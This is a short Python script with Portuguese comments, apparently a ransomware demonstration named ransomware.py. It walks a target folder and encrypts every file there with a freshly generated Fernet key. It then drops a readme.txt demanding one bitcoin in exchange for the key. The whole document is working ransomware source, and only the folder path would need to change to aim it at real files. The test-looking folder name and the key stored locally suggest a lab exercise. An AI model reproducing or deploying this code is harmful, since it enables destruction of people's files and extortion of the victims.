import os
from cryptography.fernet import Fernet

# Gerando chave de criptografia
key = Fernet.generate_key()
with open("filekey.key", "wb") as filekey:
    filekey.write(key)

# Definindo o diretório alvo
folder_path = r"c:\documentosteste"

# Listando arquivos no diretório especificado (excluindo o script e a chave)
files = []
for root, dirs, filenames in os.walk(folder_path):
    for filename in filenames:
        if filename in ['filekey.key', 'ransomware.py', 'readme.txt']:
            continue
        filepath = os.path.join(root, filename)
        if os.path.isfile(filepath):
            files.append(filepath)

# Criptografando arquivos
fernet = Fernet(key)
for file in files:
    with open(file, "rb") as f:
        data = f.read()
    encrypted = fernet.encrypt(data)
    with open(file, "wb") as f:
        f.write(encrypted)

# Criando o arquivo readme.txt na pasta alvo com a mensagem
readme_path = os.path.join(folder_path, "readme.txt")
with open(readme_path, "w") as readme:
    readme.write("Os seus arquivos foram criptografados! Para adquirir a chave de acesso, enviar o pagamento de 1 bitcoin para a conta zamb@malefia.xis")

print("Arquivos criptografados com sucesso")
